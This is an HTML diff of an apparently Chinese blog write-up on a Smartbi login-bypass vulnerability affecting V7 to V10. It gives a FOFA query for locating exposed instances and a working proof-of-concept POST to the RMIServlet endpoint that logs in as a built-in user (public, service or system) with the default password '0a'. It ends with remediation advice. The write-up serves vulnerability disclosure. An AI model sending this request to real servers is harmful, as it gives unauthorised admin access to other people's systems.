@@ -482,8 +482,14 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>#Smartbi内置用户登录绕过漏洞</p>
-<p>##一、Smartbi介绍<br>Smartbi大数据分析产品融合BI定义的所有阶段，对接各种业务数据库、数据仓库和大数据分析平台，进行加工处理、分析挖掘和可视化展现；满足所有用户的各种数据分析应用需求，如大数据分析、可视化分析、探索式分析、复杂报表、应用分享等等。<br>##二、漏洞描述<br>Smartbi在安装时会内置几个用户，在使用特定接口时，可绕过用户身份认证机制获取其身份凭证，随后可使用获取的身份凭证调用后台接口，可能导致敏感信息泄露和代码执行。<br>##三、影响范围<br> V7 &lt;&#x3D; Smartbi &lt;&#x3D; V10<br>##四、复现环境<br>FOFA：app&#x3D;”SMARTBI”<br><img src="/Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/1.png" alt="fofa"><br>##五、漏洞复现<br>验证漏洞是否存在<br><br><code>http://your-ip/smartbi/vision/RMIServlet</code><br><br><img src="/Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/2.png" alt="fofa"><br><br>出现以上这种情况，说明存在漏洞<br><br>###Poc:<br></p>
-<p><strong>POST &#x2F;smartbi&#x2F;vision&#x2F;RMIServlet HTTP&#x2F;1.1</strong><br><br><strong>Host: your-ip</strong><br><br><strong>Content-Type: application&#x2F;x-www-form-urlencoded</strong><br><br><br><br><strong>className&#x3D;UserService&amp;methodName&#x3D;loginFromDB&amp;params&#x3D;[“system”,”0a”]</strong><br><br><br><br><br>请求体中传入的三个参数<br><br>className：必须指定UserService类名methodName：该类调用的方法loginFromDB<br><br>params：其中的第一个参数是内置的三个用户名（public、service、system）可随机构造，第二个参数是三个账号默认的密文密码(默认值为0a)<br><br><br><br><br>###使用Hackbar插件发送post请求绕过登录<br><img src="/Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/3.png" alt="fofa"><br><br>发送请求后，刷新页面，成功登录后台<br>##六、修复建议<br>删除内置账号，设置策略不开放在公网上<br><br>及时使用官方升级补丁更新</p>
+<p>##一、Smartbi介绍<br>Smartbi大数据分析产品融合BI定义的所有阶段，对接各种业务数据库、数据仓库和大数据分析平台，进行加工处理、分析挖掘和可视化展现；满足所有用户的各种数据分析应用需求，如大数据分析、可视化分析、探索式分析、复杂报表、应用分享等等。<br>##二、漏洞描述<br>Smartbi在安装时会内置几个用户，在使用特定接口时，可绕过用户身份认证机制获取其身份凭证，随后可使用获取的身份凭证调用后台接口，可能导致敏感信息泄露和代码执行。<br>##三、影响范围<br> V7 &lt;&#x3D; Smartbi &lt;&#x3D; V10<br>##四、复现环境<br>FOFA：app&#x3D;”SMARTBI”</p>
+<img src="/2023/08/04/Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/1.png" class="" title="fofa">
+<p>##五、漏洞复现<br>验证漏洞是否存在<br><br><code>http://your-ip/smartbi/vision/RMIServlet</code><br></p>
+<img src="/2023/08/04/Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/2.png" class="" title="fofa"><br>
+<p>出现以上这种情况，说明存在漏洞<br><br>###Poc:<br></p>
+<p><strong>POST &#x2F;smartbi&#x2F;vision&#x2F;RMIServlet HTTP&#x2F;1.1</strong><br><br><strong>Host: your-ip</strong><br><br><strong>Content-Type: application&#x2F;x-www-form-urlencoded</strong><br><br><br><br><strong>className&#x3D;UserService&amp;methodName&#x3D;loginFromDB&amp;params&#x3D;[“system”,”0a”]</strong><br><br><br><br><br>请求体中传入的三个参数<br><br>className：必须指定UserService类名methodName：该类调用的方法loginFromDB<br><br>params：其中的第一个参数是内置的三个用户名（public、service、system）可随机构造，第二个参数是三个账号默认的密文密码(默认值为0a)<br><br><br><br><br>###使用Hackbar插件发送post请求绕过登录</p>
+<img src="/2023/08/04/Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/3.png" class="" title="fofa"><br>
+<p>发送请求后，刷新页面，成功登录后台<br>##六、修复建议<br>删除内置账号，设置策略不开放在公网上<br><br>及时使用官方升级补丁更新</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1050053641@qq.com </span>
